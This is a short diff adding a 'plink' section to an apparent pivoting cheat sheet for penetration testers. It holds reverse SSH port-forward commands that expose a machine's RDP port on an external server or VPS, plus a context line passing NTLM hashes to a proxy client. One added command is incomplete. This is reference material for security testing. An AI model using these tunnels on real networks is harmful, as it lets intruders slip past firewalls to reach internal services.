@@ -92,6 +92,14 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
 ```
 
+## plink
+
+```powershell
+plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
+plink -l root -pw mypassword 192.168.18.84 -R
+plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
+```
+
 ## Basic Pivoting Types
 
 | Type              | Use Case                                    |
